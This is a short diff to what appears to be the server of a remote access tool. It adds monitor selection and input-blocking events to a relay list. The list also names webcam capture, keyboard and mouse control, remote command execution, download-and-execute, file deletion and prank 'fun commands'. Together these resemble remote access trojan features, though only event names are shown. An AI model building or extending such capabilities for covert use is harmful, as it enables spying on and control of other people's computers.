@@ -238,7 +238,7 @@ def handle_select_client(data):
 # Events that the browser sends and the server forwards to the target client.
 
 RELAY_TO_CLIENT = [
-    "start_screen_capture", "stop_screen_capture", "set_screen_quality",
+    "start_screen_capture", "stop_screen_capture", "set_screen_quality", "set_screen_monitor",
     "start_webcam", "stop_webcam", "set_webcam_quality",
     "mouse_event", "keyboard_event",
     "terminal_start", "terminal_input", "terminal_stop",
@@ -250,7 +250,7 @@ RELAY_TO_CLIENT = [
     # Fun commands
     "wallpaper_set", "msgbox_show", "open_url", "take_screenshot",
     "get_geoip", "get_apps", "play_sound", "search_files",
-    "execute_command", "download_exec",
+    "execute_command", "download_exec", "input_block", "input_unblock",
     "file_list", "file_download_request", "file_upload_chunk",
     "file_delete", "file_new_folder",
     "kill_switch",
